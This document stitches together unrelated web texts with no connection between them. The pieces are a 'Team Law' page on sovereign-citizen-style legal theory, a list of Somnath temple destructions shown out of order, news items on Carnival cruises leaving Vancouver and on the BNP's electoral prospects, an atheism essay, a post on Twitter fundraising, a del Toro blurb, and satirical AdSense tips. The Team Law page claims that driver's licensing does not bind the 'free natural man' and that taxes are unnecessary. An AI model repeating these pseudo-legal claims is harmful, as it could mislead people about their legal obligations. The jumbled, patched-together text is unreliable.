Our purpose in presenting this page is to give you a brief overview how the law works so you can have a chance of learning to apply it properly to any given situation .
Accordingly we first acknowledge :
People rightfully believe it is right and proper to :
“ Obey , honor and sustain the Law . ”
Thus , we ask : “ How can anyone obey , honor , sustain or comply with the Law if they do n’t know what it is ? ”
The undeniable answer is , “ You can not .
It ’s impossible to obey , or honor , or sustain or even comply with the law , if you do n’t know what the law is ! ”
At Team Law we help people learn the law for themselves because we believe everyone should obey , honor , sustain and comply with the law .
The only way to sustain a Republic form of government [ that is : a law controlled government of the people , by the people and for the people ] is the people must know the Law .
Most of us gained our understanding of our history and the Law from someone else ’s testimonial , rather than from a direct study of the law itself from its source .
In all likelihood you learned what you thought was law from friends , family , employers or the media ; but , from what source did they learn it ?
Chances are they learned it from a similar hearsay sources .
In most cases we picked it up along the way .
When we learned to ride a bike we were told we had to ride it on the same side of the street as the car traffic and that we were supposed to obey the same traffic rules as cars .
But , from what source did we learn those traffic rules ?
We generally accepted our parents ’ word on it .
Some of us received a pamphlet from the state regarding bicycle safety — but , was that law , an excerpt from ‘ the revised statutes ’ , common sense or a mixture of all three with a bit of personal opinion thrown in for good measure ?
When we progressed to driving cars , did we study the actual law or did we just follow the school ’s and or our parents ’ instructions that we needed a license plate on the car and a driver ’s license to drive it ?
When we studied to prepare for the driver ’s license exam , did we actually study the law or did we just study another booklet prepared by ‘ The State ’ ?
When we studied such matters , did we study from the source , learning first the history of the law and its application , or did we simply cut to the chase and study whatever we needed to pass the presupposed obligatory test ?
To actually know the law we have to learn it from our own study of it .
Each element of the law has its own basis in history and fact .
Ultimately , all Law comes from God to man and from man to government .
Thus , by using the “ Standard for Review ” , we can always track the Law to its source and from that study we can know the Law .
In fact , it is quite simple .
The founding fathers of our Constitutional Republic lived on their own private land as free natural sovereign independent people with no central government controlling them — they had Liberty .
After the French American
War they found themselves at odds with Great Britain in its attempt to usurp the power to rule over them ; as if they were chattel property of Great Britain .
When Great Britain ’s unlawful rule became unbearable , Thomas Jefferson wrote the Declaration of Independence , which each of the 13 independent States signed , as the foundational instrument that united the people in a Union of States ; to unanimously inform one and all of the necessity that they dedicate their lives to fight for Liberty in “ The War of Independence ” against Great Britain .
Ultimately , our Constitutional Republic was formed and every State entering into the Union of States thereafter had an Enabling Act authorizing and limiting the State ’s entrance into the Union .
The Enabling Acts granted the people within various territories authority to form State constitutions providing , under an “ ordinance irrevocable ” , that the State could pass no law repugnant to the principles of the Declaration of Independence and the Constitution of the United States of America .
The number one principle of that Declaration and of the Constitution was the peoples ’
God given inherent inalienable right to Liberty ; the definition of which the United States Supreme Court has confirmed as : ‘ the right to take your property and come and go as you please without government interference . ’
So , where could the State have received the authority to compel a driver ’s license ?
Has that irrevocable ordinance been revoked ?
No , it has not .
Is the state violating that ordinance by requiring such licenses ?
No , that has also been ruled lawful .
Then what happened ?
Now , there ’s a question that might get us somewhere ; the answer begins by noticing a relationship exists between several parties under the statute ; therefore , in order to understand the law we must first understand the relationship .
To simplify such things Team Law has presented a “ Standard for Review ” in its Open Forum .
Following the “ Standard for Review ” we learn that in order to understand the law we must know our history .
Learning the Law using Team Law’s “ Standard for Review ” makes understanding both how the driver ’s license can be compelled against the taxpayer and not apply to the free natural man .
Team Law can also help the man learn how he can control the taxpayer with its necessary licenses and yet remain free and naturally independent from the same without conflict ; the key is learning and understanding the law .
Standard for Review
Rule 1 : To understand any relationship you must : Always know yourself first ( start at Genesis 1:2629 ) ; Discover the true nature of all other parties second ;
First understand who the parties are ( from their origin ) ;
Then you must understand the historical and environmental nature of the relationship ; and , Only then can you understand how applicable laws may effect the relationship ; thus , it s time to study such laws .
Rule 2 : Review the details of the relationship in question only after you have completed the review required by Rule 1 , then review the actual terms of the relationship and the details in question in accord with what you learned from applying Rule 1 .
Today , we are used to learning about current events from testimonials broadcast on TV , radio and in print .
Ask anyone if you can believe what you read , hear or see in the media and they will tell you : “ No ! ” Then , ask them about what happened on “ 911 ” and they will rehearse the story of what they saw in the media regarding the events of September 11 , 2001 .
We simply do not know what is going on around us and virtually every source we go to for understanding is selling something themselves — so naturally their information is tainted to support their product .
The problem is , when you gain your understanding from any place other than the original source itself , chances are , your understanding is tainted by the spin or opinion of the vendor ; and , studying the mater directly without support seems nearly impossible .
Understanding law is no different ; to understand law we must understand history ; to understand either we must go to their source .
Having an informed yet unbiased guide like Team Law helps .
For that reason , much of what you find on Team Law ’s website is dedicated to presenting history and unraveling myths of both Patriot and Corp U.S. Mythology .
We hope people will not simply believe us ; rather , we hope they will do their own research and prove the facts for themselves .
We help people learn from the source .
Once armed with knowledge of law and what ’s happening around us , people find they can secure their : families , land , property , businesses interests and their lives in virtually every aspect .
If you would like to see the people of our nation rally together for the purposes of legally and lawfully getting what appears to be government back under control , out of your pocketbook and off from your back ; eliminating any need for taxation and getting our nation 's monetary system ( gold and silver coin ) back in full operation ; having your natural sovereignty recognized and your rights secured against governmental trespass ; getting foreign powers out of control of our government ; and getting our Constitutional Republic back , then : Support Team Law
Help us seat the original jurisdiction government officials in their lawful seats of government .
When we say , “ eliminate any need for taxation ” , we are not referring to any scheme for any cause that would use any means to fail to pay any lawful obligation to any taxing agency .
We are saying , though it is possible that you might ( with a lot of luck ) live in concert with the law , if you do not know the law you cannot possibly : obey , honor , sustain or comply with it ; taxes are no exception !
So , we must learn the law — when we learn the law , and hold our governments accountable to the laws the founding fathers of this nation secured in this Constitutional Republic , there is no need for income , sales or property taxes at all .
Our experience shows , when people learn the law and live accordingly , they generally incur no tax debts even according to the laws , rules and regulations controlling tax collecting agencies in our nation today .

The temple and citadel were ransacked , and more than 50,000 defenders were massacred .
Mahmud personally hammered the temple 's gilded lingam to pieces and the stone fragments were carted back to Ghazni , where they were incorporated into the steps of the city 's new Jamiah Masjid ( Friday mosque ) .
This was destruction No. 2 .
4 . The fourth temple was built by the Paramara King Bhoj of Malwa and the Solanki king Bhima of Gujarat ( Anhilwara ) or Patan between 1026AD and 1042AD .
The wooden structure was replaced by Kumarpal who built the temple of stone .
5 . The temple was razed again in 1297AD when the Sultanate of Delhi conquered Gujarat , and again in 1395AD , and once more in 1401 AD ( please see quote at end of this article ) .
These were destructions
No 3 , 4 , and 5 .
6 . The last destruction of Somnath was by the last Mughal Emperor Aurangzeb in 1706AD , just a year before his death .
This was destruction No. 6 .
Sardar Vallabhbhai Patel , then Home Minister & the first Deputy Prime Minister of India took a pledge on November 13 , 1947 for Somnath 's reconstruction for the seventh time .
A mosque present at that site was shifted few miles away .
The construction was completed on December 1 , 1995 and the then President of India , Dr. Shankar Dayal Sharma dedicated it in the service of the nation .
The present temple was built by the Shri Somnath Trust which looks after the Shri Somnath temple complex .
I end with the description of Muzaffar Khan 's destruction of Somnath , taken from M. M. Syed 's " History of the Delhi sultanate " , pp. 184 :
" Next year , in 1395 , Muzaffar Khan invaded Somnath , burnt the temple , and
destroyed the idol .
He killed many hindus , and left the place after arranging
for the erection of a mosque .
In 1401 , news reached him that the hindus were
trying to restore the temple of somnath , and revive their customary worship .
Muzaffar immedaitely proceeded thither with an army , and the Hindus , defeated
after a sharp encounter , retired to the fort of the lop .
This fort also fell
after a few days of fighting , and Muzaffar killed the entire garrison , and had
the men trampled under the feet of elephants .
He then demolished the temples and
laid the foundations of a mosque . "

Muslim invaders and rulers destroyed over 10,000 Hindu temples over the centuries .
Perhaps none was destroyed as many times , and rebuilt as many times , as Somnath .
The destruction of Somnath by Mahmud Ghazni is well known .
Here is a list of the lesser known destructions of Somnath .
Each time , the temple was rebuilt by Hindus , often accompanied by great loss to Hindu life .
Somnath is the symbol of Hindu defiance and resilience in the face of barbaric assault that would have ( and did ) bury most other civilizations .
Vancouver 's tourism sector is set to lose about $ 18 million next year after Carnival Cruise Lines said it 'll start using Seattle as its main departure point for passengers taking Alaskan cruises .
Starting in 2010 , 17 week - long Alaska cruises will operate from the Port of Seattle aboard the 2,124 - passenger Carnival Spirit .
At present , the Spirit departs out of Vancouver and tourism officials say it 's going to have a significant impact on the local economy .
" Generally we get about $ 2 million worth of economic activity for every sailing , " Steve Pearce , vice - president of Tourism Vancouver , told CTV.ca on Tuesday .
" Carnival is going to be pulling nine sailings out of Vancouver so that 's about an $ 18 million hit to our local economy . "
Vance Gulliksen , a spokesperson for Carnival , said the decision was made to " offer a new Alaska cruise option " for customers .
" This new itinerary will provide our guests requiring air transportation with more convenient air options and significantly lower air costs , " Gulliksen told CTV.ca in an email .
" It will also allow our guests in some areas of the western regions of the U.S and Canada to drive to Seattle , making our Alaska cruises even more affordable . "
Pearce said he suspects the current " economic circumstances " were a main factor behind Carnival 's decision .
" The bulk of passengers are American citizens and they feel that they can move their inventory a little closer to their market , " he said .
Although there are about 270 sailings out of Vancouver annually , Pearce said the loss of the Carnival Spirit is " nothing to sneeze at . "
He said his organization has been working hard with cruise operators to remind customers that their Alaska vacation starts in Vancouver .
" We know that one of the common complaints from cruise passengers once they 've taken their trip out of Vancouver was that they were n't aware that this city has what it has here -- it 's proximity to Victoria , Whistler , to the Okanagan , " Pierce said .
" It 's not uncommon to get people complaining that if they had known that this was what Vancouver was they would have stayed here longer . "
He said if the decision were solely based on price , it 'd probably be cheaper to fly out of Seattle .
Pierce said he has n't seen any other cruise lines taking similar measures .
He also said he views the move as a " tactical decision " by Carnival not a " strategic decision . "
" The Alaska cruise industry is going to continue to be very robust , " Pierce said .
" We 'll continue to get our share of customers in a market that is going to grow . "

The British National Party is on course to win its first seats in the European Parliament this year , Gordon Brown has been warned .
Senior Labour figures have told the Prime Minister they believe two BNP candidates are likely to be sent to Brussels under the proportional representation system of voting , The Independent has learnt .
They fear Labour ’s campaign for the European election in June has been too slow to get off the ground and its lack of preparation is allowing the BNP to win over disaffected Labour voters .
Yesterday , the far - right party was celebrating a surprise win in a council by - election in Swanley , Kent , where the BNP candidate took 41 per cent of the vote after Labour ’s support collapsed .
Download the new Independent Premium app Sharing the full story , not just the headlines
It is the first time the BNP has won an election in a southern English county , and shows it is broadening its appeal beyond its traditional northern heartlands .
The party also polled more than 28 per cent of the vote this week in a council by - election in Thringstone , Leicestershire – a seat it had never contested before .
Mr Brown has been told the BNP has a strong chance of fielding successful candidates in the North - west of England and Yorkshire and the Humber .
A senior Labour source told The Independent yesterday : “ We have got to get our act together – and very quickly .
No one is focusing on the European elections ; no one knows who is in charge . ”
Last night , the former minister Peter Hain warned that every political party was guilty of “ complacency ” over the threat posed by the BNP .
He said : “ Everybody across the political spectrum – especially the Labour Party – has to prioritise beating the BNP with a vigorous strategy based on grassroots politics to win local trust and also making sure we deliver on affordable housing and deliver on jobs .
“ There is very fertile territory for [ the BNP ] now .
When people are losing their jobs and there is an economic downturn ... it ’s heaven - made for them . ”
Labour officials believe the BNP is well placed to attract support from the UK Independence Party , which won 16 per cent of the vote at the last European election , but has since imploded .
They are also worried that disillusionment with the Government among traditional Labour voters will tempt them to support the BNP or not turn out at all .
The UK is divided into 12 regions for the European ballot , with voters asked to back parties rather than candidates .
In practice , a party must win between 8 and 13 per cent of the total votes cast to have at least one representative picked from a list of nominees , depending on the size of the region .

In the North - west , where the BNP leader , Nick Griffin , is its main candidate , the party has to add only two or three percentage points to the 6.4 per cent of the vote it secured in 2004 .
In Yorkshire and Humber , where the BNP polled 8 per cent last time , it probably has to increase its support by three or four points .
Jon Cruddas , the Labour MP for Dagenham , who campaigns against the far - right group , acknowledged that conditions look better for the BNP now than they did five years ago , when it last came close to winning a seat .
Mr Cruddas said : “ Five years ago , Ukip did very well and five years ago we had a benign economic environment .
Now there is a global crisis .
Everything else being equal , it ’s going to be tricky . ”
The BNP ’s ability to spring surprises in previous no - go areas was underlined on Thursday during the ballot in Swanley St Mary ’s , which used to be a rare , Labour - leaning ward on the Tory - controlled Sevenoaks District Council .
The BNP ’s Paul Golding captured it with a majority of 76 over Labour .
The Tories finished third .
Mr Golding said afterwards : “ I ’m going to put British people first on the housing queue .
I ’ve had lots of complaints that foreigners and asylum - seekers are getting ahead of them . ”
A Labour activist , Lesley Dyball , claimed that a group of people who walked out of the building where the polling station was sited , holding what she believed to be a BNP leaflet , were laughing and shouting “ blacks out ” .
The BNP ’s victory at Swanley follows its near - miss last month in an election in the neighbouring London Borough of Bexley .
Simon Darby , the deputy party leader , said it would mount a vigorous contest in the European elections , adding : “ We are in place for 10 seats and we ’ve worked out if we can secure around 8 per cent of the vote we will take one of them . ”
The BNP threat will be highlighted today at a London rally organised by the group Unite Against Fascism ( UAF ) .
Speakers include Mr Hain , the former London mayor Ken Livingstone and Ennio Odino , a Holocaust survivor .
The UAF secretary , Weyman Bennett , said : “ Hitler used the economic crisis of the 1930s to gain a hearing for racists and murderous policies . ”
Looking out my window , I see grass .
It is mostly green and will become greener as spring deepens .
Suppose someone were to try to convince me that this grass was not green at all but a bright royal blue .
I am not sure any amount of argument , pleading , threats , favors , etc. could persuade me that the grass I see was blue .
Under torture , I would certainly profess that I believed it to be blue , but it is difficult to imagine that I could actually convince myself that it was so .
With sufficient rewards , I would certainly agree publicly that the grass was blue , but I would not really believe it .
By learning about the science of vision , I could be convinced that the grass was not inherently green but reflected light in such a manner that I perceived it as green .
Still , I would not be able to stop believing that I was perceiving it as green .
In many respects , this is how the atheist experiences god belief .
I could no more convince myself that the Christian god was real than I could convince myself that my front yard was full of blue grass .
It is observations like this that led me to question the degree to which atheism is voluntary .
Do n't get me wrong , I am not claiming that atheism is an involuntary response or somehow predetermined .
I am merely suggesting that atheism seems much less voluntary than many other beliefs .
Sitting here today , knowing what I know , experiencing what I have experienced , living the life I have led , I am not sure that I could now convince myself to believe in the Christian god or associated dogma even if I desperately wanted to do so .
It is as if I have passed a point of no return .
For years , I managed to convince myself that the Christian god about which I had heard so much was real .
But I have never been one to take things on faith .
I ask too many questions , and I seek genuine answers .
Atheism , the gradual erosion of my willingness to accept the truth of the claim that gods exist , was the eventual result of such inquiry .
My eyes are now open , and I seriously doubt that I could close them no matter how much I wanted to .
Perhaps uttering a magic incantation of some sort would instantly transport me to blissful mindlessness , but I doubt it .
Besides , I 'd much rather my eyes remain open .

We 've been hearing a lot about larger scale fundraising efforts on Twitter and cause fatigue and how it will become more and more difficult for charities to distinguish their social giving campaigns amid the noise .
One strategy might be cultivating relationships with freelance fundraisers and activists .
These smaller scale efforts represent some of the more creative fundraising campaigns undertaken on Twitter .
Typically launched by an social media savvy individual , who cares deeply about a charity or Cause , and these campaigns use platforms like Twitter in an unique way to raise money for that charity from their network .
Take for example , Drew Olanoff , who I had the pleasure of meeting at Gnomedex last summer .
Two weeks ago , Drew announced his Twitter fundraising campaign to raise money for the Make - A - Wish Foundation , a charity that " grants wishes for children with life threatening medical conditions . "
He brought together his three passions :
I ’m known to get tattoos
I ’m known to care about charity
I ’m known to dig Twitter
He offered to put a permanent tattoo of the Twitter user 's name on his arm , to the highest bidder .
His cause says a lot about who he is and who is friends are !
Following the best practices of person - to - person fundraising and that is to talk about why the charity is important to you , he shares his reason , " kids deserve awesomeness " .
He put the word out on Twitter and his network started a bidding war .
Louis Gray writes about how he bid several hundred dollars for the honor .
In the end , Melanie Mitchell was the lucky winner , bidding $ 2,112 to have her Twitter name on Drew 's arm .
Louis Gray has an interview with her .
Great work Drew !

When I heard about this story , I was curious about Drew 's tatoos .
I searched flickr and found the above photo taken by video blogger Steve Garfield .
Steve 's been a huge supporter of the Sharing Foundation .
Just over the weekend , he won a contest on Twitter and donated his prize money to the Sharing Foundation .
Thank you Steve !
What creative fundraising efforts have you seen taking place on Twitter or elsewhere on the social web ?
With Dartmoor ’s own Alan Lee rumoured to have had talks with The Hobbit director Guillermo del Toro , we thought we ’d bring you news from the Guadalajara International Film Festival , which has Dissecting Fantasies : The Secrets of Guillermo del Toro .
Deborah Bonello reported on the event for the Frontline Club , and watched the development of Del Toro ’s creatures , which have the kind of physicality that seems right up Senor Lee ’s street .
Pretty tenuous , but you ’ll thank us when Alan picks up another Tolkien - inspired Oscar nomination - and worth a gander .

Every day I come across and courses which promise to teach people how to make thousands of dollars a day with AdSense by following a few easy steps – so I thought it was time for one that shows you how to guarantee to keep your blog from making money with AdSense .
Here ’s my top 10 tips for a guaranteed earning of 0.14 cents or less per month from your blog :
1. Position Ads Out of Sight – Ensure that you put any ad units that you put on your blog below the fold where they ’ll be sure not to annoy your readers .
If you do choose to put your ads above the fold ( why you would I ’ll never know ) make sure they are placed in the white zones in the diagram to the right .
Obviously the bottom of the page is best but the top right corner and right hand skyscraper positions can also work against you very well .
Do your best to keep the ads away from the areas that people ’s eyes will be drawn to ( ie away from content , pictures etc ) .
This helps keep the money from rolling in quite well .
2 . Only post to your blog once every few weeks – Lull your readers into a hypnotic trance decrease the chances of them ever visiting your blog .
3. Unclear Post Topics –
If and when you do choose to post make sure that your posts have as little focus as possible in terms of topic .
Write about multiple topics in every post in an attempt to confuse the AdSense bots .
Never blog about anything with a commercial aspect to it and attempt to keep your posts as uninteresting , unoriginal and as useless to readers as you possibly can .
4. Poor Post Titles – Never use the keywords that relate to your post in your post ’s title .
In order to get lower paying ( and irrelevant ) ads use the word ‘ blog ’ as much as possible both in your titles and posts .
Also try to find topics to write about that AdSense has no ads in their inventory for .
Do this by simply adding keywords into Google.com until no ads come up next to the search results .
5 . Never set your ads to show Alternative Ads –
If you do your readers will see ads that might make you money when Google can’t find any of their own to show ( something that ideally you will have if you get # 4 above right ) .
A much better strategy is to just allow the PSA ( public service ads ) to appear which will guarantee you earn nothing at all .
6. Click your own AdSense ads –
This might make your AdSense total go up for a little while but the chances are that you ’ll never see the money because you ’ll be banned from the system .
You might even go into negative earnings if Google decides to get their lawyers onto you !
7. Break Other Rules –
If clicking on your own ads does n’t get you banned fast enough try breaking some of the other AdSense terms and conditions like blatantly encouraging your readers to click your ads , using obscene language , writing constantly about violent and adult topics , labeling your ads with things like ‘ free prizes if you click here ’ or by putting flashing arrows pointing at the ads etc .
Another good one is to add YPN ads to the same pages that AdSense ads are on .
This has the double bonus of possibly getting you banned from both programs in one hit !
If AdSense do contact you to make a change to some rule you ’ve broken it ’s best to ignore these emails , or if you decide to write back be as argumentative and uncooperative as possible .
8 . Make your ads stand out – Set your AdSense ad design to completely clash with the rest of your blog ’s design .
Blending your ads is for sissies – be bold !
In essense what you ’re aiming for is to make your ads look as much out of place and as ad - like as possible .
Here ’s a few of my personal favorites ( keep in mind I ’m not a very good designer – I ’m sure you could do worse if you put your mind to it ) :
9 . Never track your AdSense ads performance – Definitely do not use channels to monitor how your different ads perform .
This way you ’ll ensure that if you do happen to fluke some well performing ads – you ’ll never know which ones they were and will never be able to reproduce the results elsewhere .
10 . Lower your Traffic – Ultimate the probably one of the best ways to ensure you never make much money from AdSense is to work hard at maintaining as little traffic as possible to your blog .
You can do this in many ways including :
Ignoring any readers that do happen upon your blog
Practicing black hat SEO principles to make sure you get banned from Google and other Search Engines
Writing the worst content possible
Stealing other people ’s content ( and other unethical practices )
Post as infrequently as possible ( I know I ’ve said this already – but it ’s worth repeating )
Never promote your blog in any online or offline forums
If you do have an occasional surge in traffic you can always remove the ads from the page that is getting the most traffic .
Some bloggers do this well by only showing ads on certain pages ( like their front page ) and not showing them on other pages that get traffic .
Bonus Chitika Tip –
If you want to branch out from AdSense and not earn much from other ad programs you might like to join up with Chitika and try many of the above strategies also .
Another good one with Chitika is to use the default settings and keywords .
If you really want to push it with Chitika you should target keywords that are as irrelevant to the topic of your blog as possible .
In fact you can use this strategy with many money making strategies for your blog – especially affiliate programs .
The more irrelevant they are to your blog ’s topic the less chance they will convert !
